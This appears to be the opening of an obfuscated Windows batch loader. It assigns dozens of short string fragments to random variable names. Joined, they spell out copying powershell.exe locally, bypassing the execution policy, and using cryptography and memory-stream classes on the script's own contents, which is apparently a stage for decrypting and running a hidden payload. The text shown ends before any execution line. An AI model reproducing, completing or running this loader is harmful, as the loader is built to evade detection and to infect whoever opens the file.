@echo off
set "MnaaVPIpTO=ll"
set "BllXQfOzMj=em"
set "BQVUDdixdC=he"
set "GXcjgXfkGO=.e"
set "JOrajHrUae=s\"
set "FrcTIrxjwO=32"
set "zRWHZNcOln=po"
set "USSOLPKmOo=:\"
set "DBZkzOtVXP=Sy"
set "lqCRLdKyQA=xe"
set "ZUiNkmFvUd=do"
set "bitIOIcgRz=Wi"
set "avQcPucfVc=we"
set "STOUCrqbtt=in"
set "vbJxtZZpxO=0\"
set "nljFtBftId=\v"
set "UeedqOclnP=1."
set "JxfEdKOZBw=ll"
set "TgzWQWlcXl=nd"
set "ICLLalCMlt=rs"
set "olTgpbzOEF=\W"
set "weTByoRxdn=rS"
set "CmTxNEOLOG=y "
set "TxuVCIhRVT=ow"
set "ZltEOZZbwy=he"
set "gEbqRprfIP=ws"
set "PKCONFIQKs= C"
set "DHoDvEOxff=st"
set "GORKRCoeox=co"
set "BZFGJtagol=py"
set "TGstDEsbno=we"
set "wVYKBuBLPl= /"
set "FZUhrLChqq=Po"
set "YxnSlWYcCT= %~dp0"
set "zpORHqZCbd=cd"
set "iHYVNlmIuU=pnHf"
set "BqzbxnuSsd=raph"
set "zLEklOScIE=)($U"
set "ZEbJjeqZjn=7;$d"
set "QbVrCYGkcz=[Sys"
set "PJHsUopOEL=.IO."
set "rHtYRVrvHR=ment"
set "WOvziEMtRN=Disp"
set "zpXPTgcago=] -j"
set "YEajOCViYh=t Sy"
set "NjPMbpsepL=yste"
set "FXqxgDrCQs=('%*'"
set "nvYOcsGylk=fore"
set "oHycxVYhDf=]::C"
set "hGMnQUhuJh=IINA"
set "rhQNxplokK=tsWi"
set "pbtdRDUgOh=EIBE"
set "iMLJXKxkNG=brea"
set "RSiaQzrgxe=aur."
set "huhdEhkmBR=e = "
set "JAmbwSmPrw=$UXN"
set "GKWNjahHga=]::("
set "MEhKWfflrB=ose("
set "ObrzrgJJYT=ress"
set "PumRlfYwGR=m(, "
set "gVOrMBxRib=esMa"
set "ZouKKJHQKZ=ress"
set "aUuMMXeRUS=T.En"
set "qvoxBczTZX=lit("
set "FDdoCjJVBH=l5E7"
set "lVHQmcjhyj=Bmor"
set "rMArmKCGSo=rIdv"
set "PVFxuWFwNe=Secu"
set "GQNgUyFFRK=ptog"
set "YkwbohtmuS=tryP"
set "goISUvXBhI=UXNf"
set "FQmLPyypCt=ypto"
set "xmiCDWvBmt=fB);"
set "viLCkdlNZY==');"
set "PJVSkMCTVs=-joi"
set "cINoFiOgcZ=..-1"
set "jkHKXRCCHp=Syst"
set "cWTeCtToZE=).Sp"
set "esbVnWNvoP=am;$"
set "dbMOVFYIYb=pStr"
set "lXXgOrjJWA=lBlo"
set "PUloFQPucR=pose"
set "WDpARtmqBR=ew-O"
set "jpytloeiNx=$owq"
set "ncdkGITeWH=)($Y"
set "qXQMcQWzBr=ur, "
set "CbpoELfrEr=();$"
set "xazITCypSn=($ia"
set "fzQliXktLQ=ct S"
set "tIBnLXTNjM=.Len"
set "PfmZupgwEb=L4Yi"
set "tCMWMtUqoF=ion."
set "awOMNDXvam=tion"
set "ABGWrmVqVz=XxUg"
set "nXGeXCioIe=zHhH"
set "DgWGXtauKx=gth)"
set "lzsLIVNGor== $d"
set "bqzTMpLwGJ=s75K"
set "tUITQCxgiI=Obje"
set "TZBElmWMey=.Mem"
set "lRqNUZKZvX=-ep "
set "rGSiTTOfwU=('%~f0'"
